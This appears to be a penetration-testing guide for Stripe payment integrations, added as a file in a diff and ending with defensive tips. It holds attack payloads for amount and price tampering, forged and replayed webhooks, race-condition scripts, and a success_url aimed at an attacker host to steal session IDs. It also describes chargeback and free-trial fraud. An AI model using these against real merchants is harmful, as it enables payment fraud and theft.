@@ -1,0 +1,905 @@
+<stripe_payment_flaws_guide>
+<title>STRIPE PAYMENT SECURITY TESTING</title>
+
+<critical>Stripe payment integrations require careful testing for payment bypass, webhook manipulation, checkout abuse, price tampering, idempotency issues, and race conditions. Focus on client-side validation bypass, webhook verification, and race conditions in payment flows.</critical>
+
+<scope>
+- Payment bypass techniques
+- Webhook signature manipulation and replay
+- Checkout session abuse
+- Price and amount manipulation
+- Idempotency key exploitation
+- Race conditions in payment flows
+- Refund and dispute abuse
+- Subscription manipulation
+- Payment method tokenization issues
+</scope>
+
+<methodology>
+1. Map all payment flows (checkout, subscriptions, invoices, transfers)
+2. Identify client-side vs server-side validation
+3. Test amount/price manipulation vectors
+4. Analyze webhook handling and verification
+5. Test idempotency and race conditions
+6. Examine refund and cancellation logic
+7. Probe subscription upgrade/downgrade flows
+</methodology>
+
+<payment_bypass>
+<amount_manipulation>
+{% raw %}
+# Client-side amount changes
+
+# Checkout Session API (server-side - secure)
+# POST https://api.stripe.com/v1/checkout/sessions
+{
+  "line_items": [{
+    "price": "price_xxxxx",  // Server-controlled price ID
+    "quantity": 1
+  }]
+}
+
+# Payment Intent API (common mistake - client-controlled)
+# POST https://api.stripe.com/v1/payment_intents
+{
+  "amount": 1000,  // Client sends amount - vulnerable!
+  "currency": "usd"
+}
+
+# Attack: Intercept and modify amount
+# Original request:
+POST /api/create-payment-intent
+{"amount": 10000, "item": "premium_plan"}
+
+# Modified request:
+POST /api/create-payment-intent
+{"amount": 1, "item": "premium_plan"}
+
+# Result: Purchased premium plan for $0.01
+{% endraw %}
+</amount_manipulation>
+
+<currency_manipulation>
+{% raw %}
+# Currency code manipulation
+
+# Original:
+{"amount": 10000, "currency": "usd"}  // $100.00
+
+# Attack 1: Change currency
+{"amount": 10000, "currency": "jpy"}  // ¥10000 = ~$75
+
+# Attack 2: Use low-value currency
+{"amount": 10000, "currency": "clp"}  // CLP 10000 = ~$12
+
+# Attack 3: Currency confusion
+{"amount": 100, "currency": "usd"}
+# But server interprets as cents without validation
+# Result: $1.00 instead of $100.00
+
+# Attack 4: Decimal vs non-decimal currencies
+# JPY has no decimal places
+# 1000 JPY = ¥1000
+# But USD: 1000 = $10.00
+# Confusion can lead to amount errors
+{% endraw %}
+</currency_manipulation>
+
+<quantity_manipulation>
+{% raw %}
+# Manipulate item quantities
+
+# Checkout session
+{
+  "line_items": [{
+    "price": "price_1JqX...",
+    "quantity": 1  // Change to negative or zero
+  }]
+}
+
+# Attack 1: Negative quantity
+{"quantity": -1}
+# May cause credit/refund instead of charge
+
+# Attack 2: Zero quantity
+{"quantity": 0}
+# Free checkout
+
+# Attack 3: Decimal quantity (if not validated)
+{"quantity": 0.01}
+# 1% of price
+
+# Attack 4: Extremely large quantity
+{"quantity": 999999999}
+# May cause integer overflow or DoS
+{% endraw %}
+</quantity_manipulation>
+
+<price_id_manipulation>
+{% raw %}
+# Switch to different price ID
+
+# Original (Premium plan - $99/month):
+{
+  "line_items": [{
+    "price": "price_premium_99",
+    "quantity": 1
+  }]
+}
+
+# Attack: Substitute price ID for cheaper plan
+{
+  "line_items": [{
+    "price": "price_basic_9",  // $9/month basic plan
+    "quantity": 1
+  }]
+}
+
+# Or use price ID from different product
+# Or use test mode price ID in production
+
+# Enumerate price IDs:
+# - Increment/decrement IDs
+# - Check API responses for leaked IDs
+# - Test mode IDs may be guessable: price_test_xxxx
+{% endraw %}
+</price_id_manipulation>
+
+<metadata_injection>
+{% raw %}
+# Metadata field abuse
+
+# Stripe allows custom metadata
+# If server reads metadata to determine features:
+
+{
+  "amount": 1000,
+  "currency": "usd",
+  "metadata": {
+    "plan": "premium",     // Inject premium plan
+    "features": "unlimited", // Inject features
+    "price": "9.99",       // Claim lower price
+    "discount": "100",     // 100% discount
+    "is_admin": "true"     // Privilege escalation
+  }
+}
+
+# Server-side mistake:
+payment = stripe.PaymentIntent.create(...)
+plan = payment.metadata['plan']  // Trusts client metadata!
+grant_access(user, plan='premium')  // Bypass payment
+{% endraw %}
+</metadata_injection>
+</payment_bypass>
+
+<webhook_manipulation>
+<signature_bypass>
+{% raw %}
+# Stripe webhooks use signature for verification
+
+# Header: Stripe-Signature: t=timestamp,v1=signature
+
+# Proper verification:
+stripe.Webhook.construct_event(
+  payload, sig_header, webhook_secret
+)
+
+# Attack 1: No verification
+# If server doesn't verify signature:
+POST /webhooks/stripe
+Content-Type: application/json
+
+{
+  "type": "payment_intent.succeeded",
+  "data": {
+    "object": {
+      "id": "pi_fake123",
+      "amount": 10000,
+      "metadata": {"user_id": "victim123"}
+    }
+  }
+}
+
+# Server grants access without payment
+
+# Attack 2: Missing signature header
+# Some implementations fail open without signature
+
+# Attack 3: Signature from test environment
+# Use test mode webhook secret
+Stripe-Signature: t=123,v1=<test_signature>
+{% endraw %}
+</signature_bypass>
+
+<webhook_replay>
+{% raw %}
+# Replay legitimate webhook events
+
+# Capture genuine webhook:
+POST /webhooks/stripe
+Stripe-Signature: t=1234567890,v1=abc123...
+{
+  "type": "payment_intent.succeeded",
+  "data": {...}
+}
+
+# Replay attack:
+# Resend same webhook multiple times
+# If server doesn't check idempotency:
+# - Multiple credits granted
+# - Multiple fulfillments
+# - Multiple notifications
+
+# Test:
+for i in range(10):
+    requests.post('/webhooks/stripe', 
+      headers={'Stripe-Signature': captured_sig},
+      data=captured_payload)
+
+# Expected: Only first processed
+# Actual (vulnerable): All processed
+{% endraw %}
+</webhook_replay>
+
+<event_injection>
+{% raw %}
+# Forge webhook events
+
+# Event types to test:
+# - payment_intent.succeeded (grant access)
+# - charge.refunded (issue refund)
+# - customer.subscription.created (start subscription)
+# - invoice.paid (mark invoice paid)
+# - checkout.session.completed (fulfill order)
+
+# Fake successful payment:
+{
+  "id": "evt_fake123",
+  "type": "payment_intent.succeeded",
+  "data": {
+    "object": {
+      "id": "pi_fake456",
+      "amount": 999999,
+      "currency": "usd",
+      "status": "succeeded",
+      "metadata": {
+        "order_id": "order_123",
+        "user_id": "attacker"
+      }
+    }
+  }
+}
+
+# If signature not verified, server processes fake event
+
+# Fake subscription creation:
+{
+  "type": "customer.subscription.created",
+  "data": {
+    "object": {
+      "id": "sub_fake789",
+      "customer": "cus_attacker",
+      "items": [{
+        "price": "price_premium"
+      }],
+      "status": "active"
+    }
+  }
+}
+{% endraw %}
+</event_injection>
+
+<timing_attacks>
+{% raw %}
+# Webhook timing exploitation
+
+# Race condition:
+# 1. User completes checkout
+# 2. Stripe sends webhook (async)
+# 3. User redirected to success page (sync)
+#
+# If success page grants access before webhook verification:
+# - Cancel payment immediately
+# - Keep access granted by success page
+
+# Attack flow:
+# 1. Initiate checkout
+# 2. Complete payment form
+# 3. Immediately cancel payment (within webhook delay)
+# 4. Success page still grants access
+
+# Test:
+# Monitor webhook arrival time
+# Exploit window between checkout and webhook
+{% endraw %}
+</timing_attacks>
+
+<webhook_flooding>
+{% raw %}
+# Denial of service via webhook flood
+
+# If webhooks not rate-limited:
+for i in range(10000):
+    POST /webhooks/stripe
+    {"type": "ping", ...}
+
+# May cause:
+# - Server resource exhaustion
+# - Database overload
+# - Queue backlog
+# - Legitimate webhooks delayed/dropped
+
+# Combined with signature bypass:
+# Flood with fake payment events
+# Cause accounting inconsistencies
+{% endraw %}
+</webhook_flooding>
+</webhook_manipulation>
+
+<checkout_abuse>
+<session_manipulation>
+{% raw %}
+# Checkout Session manipulation
+
+# Create checkout session:
+POST https://api.stripe.com/v1/checkout/sessions
+{
+  "success_url": "https://example.com/success?session_id={CHECKOUT_SESSION_ID}",
+  "cancel_url": "https://example.com/cancel",
+  "line_items": [{
+    "price": "price_premium",
+    "quantity": 1
+  }]
+}
+
+# Attack 1: success_url manipulation
+# If client controls success_url:
+{
+  "success_url": "https://attacker.com/collect?session_id={CHECKOUT_SESSION_ID}"
+}
+# Steal session ID, reuse for different account
+
+# Attack 2: Reuse checkout session
+# Session ID from one user used by another
+session_id = "cs_test_stolen123"
+# Different user completes payment
+# Original user gets access
+
+# Attack 3: Modify line_items after session creation
+# If session not properly validated on completion
+
+# Attack 4: success_url parameter injection
+{
+  "success_url": "https://example.com/success?session_id={CHECKOUT_SESSION_ID}&user_id=victim"
+}
+# Grant access to victim account instead of attacker
+{% endraw %}
+</session_manipulation>
+
+<discount_stacking>
+{% raw %}
+# Apply multiple discounts
+
+# Checkout session with coupon:
+{
+  "line_items": [...],
+  "discounts": [{
+    "coupon": "DISCOUNT50"  // 50% off
+  }]
+}
+
+# Attack 1: Multiple coupons
+{
+  "discounts": [
+    {"coupon": "DISCOUNT50"},
+    {"coupon": "DISCOUNT50"}
+  ]
+}
+# 100% off if not validated
+
+# Attack 2: Expired coupon
+{"coupon": "EXPIRED_COUPON"}
+
+# Attack 3: Single-use coupon reuse
+# Concurrent checkouts with same coupon
+
+# Attack 4: Wrong product coupon
+# Coupon for Product A applied to Product B
+{% endraw %}
+</discount_stacking>
+
+<payment_method_reuse>
+{% raw %}
+# Abuse saved payment methods
+
+# Save payment method:
+{
+  "payment_method": "pm_card_visa",
+  "setup_future_usage": "off_session"
+}
+
+# Attack 1: Stolen payment method ID
+# Use payment method from different customer
+{
+  "payment_method": "pm_stolen_123",
+  "customer": "cus_attacker"
+}
+
+# Attack 2: Attach to wrong customer
+POST /v1/payment_methods/pm_123/attach
+{"customer": "cus_attacker"}
+# Attach victim's payment method to attacker account
+
+# Attack 3: Off-session charge without consent
+# Charge saved payment method without authentication
+stripe.PaymentIntent.create(
+  amount=10000,
+  payment_method="pm_saved",
+  customer="cus_123",
+  off_session=True,
+  confirm=True
+)
+{% endraw %}
+</payment_method_reuse>
+
+<trial_abuse>
+{% raw %}
+# Subscription trial manipulation
+
+# Start trial subscription:
+{
+  "items": [{"price": "price_premium"}],
+  "trial_period_days": 30
+}
+
+# Attack 1: Repeated trials
+# Cancel before trial ends
+# Sign up again with new email/payment method
+# Infinite free trials
+
+# Attack 2: Trial extension
+# Modify trial_period_days on client side
+{"trial_period_days": 365}
+
+# Attack 3: Skip trial end
+# Never convert trial to paid subscription
+# Continue using service after trial_end
+
+# Attack 4: Trial_end date manipulation
+# If client sends trial_end timestamp:
+{"trial_end": 2147483647}  // Year 2038
+{% endraw %}
+</trial_abuse>
+</checkout_abuse>
+
+<idempotency_exploitation>
+<key_manipulation>
+{% raw %}
+# Idempotency keys prevent duplicate operations
+
+# Header: Idempotency-Key: unique_key_123
+
+# Attack 1: Omit idempotency key
+# Same request processed multiple times
+POST /v1/payment_intents
+{"amount": 1000, "currency": "usd"}
+# No Idempotency-Key header
+
+# Resend multiple times -> multiple charges
+
+# Attack 2: Reuse idempotency key
+# Use same key for different operations
+POST /v1/payment_intents
+Idempotency-Key: reused_key
+{"amount": 1000, "customer": "cus_A"}
+
+POST /v1/payment_intents
+Idempotency-Key: reused_key
+{"amount": 1000, "customer": "cus_B"}
+
+# First succeeds, second returns cached result
+# But which customer was charged?
+
+# Attack 3: Predictable keys
+# Generate keys: key_1, key_2, key_3
+# Attacker predicts and reuses
+
+# Attack 4: Expired key reuse
+# Keys expire after 24 hours
+# Reuse after expiration for duplicate charge
+{% endraw %}
+</key_manipulation>
+
+<race_conditions>
+{% raw %}
+# Payment race conditions
+
+# Scenario: User has $100 balance
+# Service costs $100
+
+# Attack: Concurrent purchases
+import asyncio
+import httpx
+
+async def purchase():
+    await httpx.post('/api/purchase', 
+      json={'item': 'service', 'price': 100})
+
+# Send 5 concurrent requests
+await asyncio.gather(*[purchase() for _ in range(5)])
+
+# Expected: 1 succeeds, 4 fail (insufficient balance)
+# Actual (vulnerable): All succeed (balance goes negative)
+
+# Race window:
+# 1. Check balance >= price
+# 2. Deduct balance
+# 3. Grant service
+#
+# All 5 requests pass check before any deduct
+
+# Test with HTTP/2:
+# Tighter synchronization
+# Higher success rate
+{% endraw %}
+</race_conditions>
+
+<idempotent_webhook_bypass>
+{% raw %}
+# Bypass webhook idempotency
+
+# Stripe event has 'id' field for deduplication
+# If server uses event.id:
+
+# Attack 1: Omit event.id
+{
+  "type": "payment_intent.succeeded",
+  "data": {...}
+  // No "id" field
+}
+
+# Attack 2: Modify event.id
+{
+  "id": "evt_fake_001",
+  "type": "payment_intent.succeeded",
+  ...
+}
+{
+  "id": "evt_fake_002",  // Different ID
+  "type": "payment_intent.succeeded",
+  ...  // Same data
+}
+
+# Each processed as unique event
+
+# Attack 3: Replay with expired ID
+# Event IDs may expire from dedup cache
+# Replay after expiration
+{% endraw %}
+</idempotent_webhook_bypass>
+</idempotency_exploitation>
+
+<refund_abuse>
+<partial_refund_manipulation>
+{% raw %}
+# Refund amount manipulation
+
+# Original charge: $100
+POST /v1/refunds
+{
+  "charge": "ch_123",
+  "amount": 10000  // Full refund
+}
+
+# Attack 1: Excessive refund
+{
+  "amount": 20000  // Refund more than charged
+}
+
+# Attack 2: Multiple partial refunds
+# Refund $50 twice = $100 total
+POST /v1/refunds {"charge": "ch_123", "amount": 5000}
+POST /v1/refunds {"charge": "ch_123", "amount": 5000}
+
+# If sum not checked, may exceed original charge
+
+# Attack 3: Refund already refunded charge
+# Check if charge.refunded validated
+
+# Attack 4: Refund to different payment method
+{
+  "charge": "ch_original",
+  "refund_application_fee": true,
+  "reverse_transfer": true
+}
+# Complex refund logic may have flaws
+{% endraw %}
+</partial_refund_manipulation>
+
+<dispute_manipulation>
+{% raw %}
+# Chargeback/dispute abuse
+
+# Scenario:
+# 1. User makes legitimate purchase
+# 2. Receives product/service
+# 3. Files dispute with bank
+# 4. Gets refund + keeps product
+
+# If application doesn't handle disputes:
+# User gets double benefit
+
+# Test dispute handling:
+# - Does service revoke access?
+# - Are future payments blocked?
+# - Is user account flagged?
+
+# Attack: Serial disputer
+# Purchase, receive, dispute, repeat
+# New accounts to avoid flagging
+{% endraw %}
+</dispute_manipulation>
+
+<refund_race>
+{% raw %}
+# Race condition on refunds
+
+# Scenario: User can request refund via UI
+
+# Attack: Concurrent refund requests
+for i in range(5):
+    POST /api/refund {"order_id": "order_123"}
+
+# Expected: 1 refund issued
+# Actual (vulnerable): Multiple refunds
+
+# Similar to payment race conditions
+# Check-then-refund gap
+{% endraw %}
+</refund_race>
+</refund_abuse>
+
+<subscription_manipulation>
+<plan_switching>
+{% raw %}
+# Subscription upgrade/downgrade
+
+# Downgrade to free plan:
+POST /v1/subscriptions/sub_123
+{
+  "items": [{
+    "id": "si_456",
+    "price": "price_free"  // Free plan
+  }],
+  "proration_behavior": "none"  // No prorated charge
+}
+
+# Attack 1: Unauthorized plan change
+# Change victim's subscription to free plan
+
+# Attack 2: Price manipulation
+{
+  "items": [{
+    "price": "price_basic"  // Cheap plan
+  }],
+  "metadata": {
+    "features": "premium"  // Claim premium features
+  }
+}
+
+# Attack 3: Proration abuse
+# Upgrade to premium, use features, downgrade
+# With "none" proration, no charge for premium period
+{% endraw %}
+</plan_switching>
+
+<subscription_cancellation>
+{% raw %}
+# Cancel subscription attacks
+
+# Attack 1: Cancel without access revocation
+POST /v1/subscriptions/sub_123/cancel
+# Subscription cancelled
+# But if app doesn't check, access continues
+
+# Attack 2: Cancel and recreate loop
+# Cancel before billing period ends
+# Recreate with trial
+# Repeat for free service
+
+# Attack 3: Cancel via webhook injection
+# Send fake cancellation webhook
+# If server trusts webhook, cancels subscription
+# But Stripe still charges user
+{% endraw %}
+</subscription_cancellation>
+
+<metered_billing_manipulation>
+{% raw %}
+# Usage-based billing
+
+# Report usage:
+POST /v1/subscription_items/si_123/usage_records
+{
+  "quantity": 100,  // Usage amount
+  "timestamp": 1234567890,
+  "action": "increment"
+}
+
+# Attack 1: Negative usage
+{"quantity": -1000, "action": "increment"}
+# Decrease bill instead of increase
+
+# Attack 2: Zero usage
+{"quantity": 0}
+# Free service usage
+
+# Attack 3: Timestamp manipulation
+{"timestamp": 0}  // Past billing period
+# Usage not counted
+
+# Attack 4: Action field abuse
+{"action": "set", "quantity": 0}
+# Reset usage to zero
+{% endraw %}
+</metered_billing_manipulation>
+</subscription_manipulation>
+
+<testing_techniques>
+<client_side_validation>
+{% raw %}
+# Identify client-side only checks
+
+# Browser DevTools:
+# 1. Intercept payment API calls
+# 2. Modify amount, currency, quantity
+# 3. Check if server validates
+
+# Proxy (Burp/ZAP):
+# 1. Capture payment request
+# 2. Modify parameters
+# 3. Forward modified request
+
+# Test checklist:
+# - Amount validation server-side?
+# - Currency code validation?
+# - Price ID validation?
+# - Quantity validation?
+# - Metadata sanitization?
+{% endraw %}
+</client_side_validation>
+
+<api_key_enumeration>
+{% raw %}
+# Find Stripe API keys
+
+# Publishable keys (safe to expose):
+# pk_live_xxxx (production)
+# pk_test_xxxx (test)
+
+# Secret keys (should be server-only):
+# sk_live_xxxx (production) - CRITICAL
+# sk_test_xxxx (test)
+
+# Where to look:
+# - Client-side JavaScript
+# - Mobile app decompilation
+# - Git repositories
+# - Environment variables in errors
+# - API responses
+
+# Test mode keys:
+# If test keys in production code:
+# May indicate careless key management
+
+# Key validation:
+curl https://api.stripe.com/v1/charges \
+  -u sk_found_key: \
+  -d amount=100 \
+  -d currency=usd
+# If succeeds, key is valid
+{% endraw %}
+</api_key_enumeration>
+
+<webhook_endpoint_discovery>
+{% raw %}
+# Find webhook endpoints
+
+# Common paths:
+# /webhooks/stripe
+# /stripe/webhook
+# /api/stripe/webhook
+# /webhooks/payment
+# /api/webhooks/stripe-callback
+
+# Check robots.txt, sitemap.xml
+# Search code for webhook handlers
+
+# Test endpoint:
+POST /webhooks/stripe
+Content-Type: application/json
+{"type": "ping"}
+
+# If 200 OK, endpoint found
+# Test signature requirement
+{% endraw %}
+</webhook_endpoint_discovery>
+
+<price_enumeration>
+{% raw %}
+# Discover price IDs
+
+# Price IDs are predictable:
+# price_1JqXabCd...
+# price_<unique_id>
+
+# Techniques:
+# 1. Inspect checkout sessions
+# 2. API responses
+# 3. Increment/decrement IDs
+# 4. Test mode pattern: price_test_xxxx
+
+# Enumerate:
+for price_id in price_ids:
+    resp = stripe.Price.retrieve(price_id)
+    if resp.get('amount'):
+        print(f"Found: {price_id} = ${resp['amount']/100}")
+
+# Find cheaper alternatives
+# Switch to lower-priced IDs
+{% endraw %}
+</price_enumeration>
+</testing_techniques>
+
+<validation>
+1. Demonstrate payment bypass (successful checkout with $0 or manipulated amount)
+2. Show webhook manipulation (fake event processed without signature)
+3. Prove price manipulation (checkout with wrong/lower price)
+4. Document race condition (concurrent operations violate business logic)
+5. Show idempotency bypass (duplicate operations processed)
+6. Provide reproducible API calls/requests
+7. Include webhook payload examples
+8. Show before/after account/transaction states
+</validation>
+
+<false_positives>
+- Amount validation on server side (use Price objects, not raw amounts)
+- Webhook signature verification enforced
+- Idempotency keys required and validated
+- Price IDs validated against database
+- Race conditions prevented with database locks
+- Metadata not trusted for business logic
+- Client-side data never trusted
+</false_positives>
+
+<impact>
+- Payment bypass (free products/services)
+- Account credit manipulation
+- Unauthorized refunds
+- Subscription fraud
+- Data integrity violations
+- Financial loss
+- Accounting inconsistencies
+- Double-charging/billing errors
+</impact>
+
+<pro_tips>
+1. Never trust client-sent amounts—use Price objects
+2. Always verify webhook signatures with webhook secret
+3. Use idempotency keys for all mutating operations
+4. Validate price IDs against your database
+5. Check for race conditions in balance/credit systems
+6. Test with actual Stripe test mode accounts
+7. Monitor for unusual patterns (repeated trials, high refunds)
+8. Implement rate limiting on payment endpoints
+9. Log all payment operations for audit trail
+10. Use Stripe's recommended integration patterns
+11. Test webhook replay resistance
+12. Validate metadata is not used for business logic
+13. Check subscription cancellation revokes access
+14. Test trial period manipulations
+15. Monitor for dispute patterns per user
+</pro_tips>
+
+<remember>Stripe security depends on proper server-side validation. Client-side data (amounts, prices, quantities) should never be trusted. Webhooks must have signature verification—no exceptions. Idempotency keys prevent duplicate operations but must be required and validated. Race conditions in payment flows can lead to balance manipulation. Price IDs should be validated against your database, not accepted blindly. Test mode vs production keys are critical—exposing production keys is catastrophic. Metadata is for display only, never for authorization decisions. Always test as if the attacker controls the entire client.</remember>
+</stripe_payment_flaws_guide>
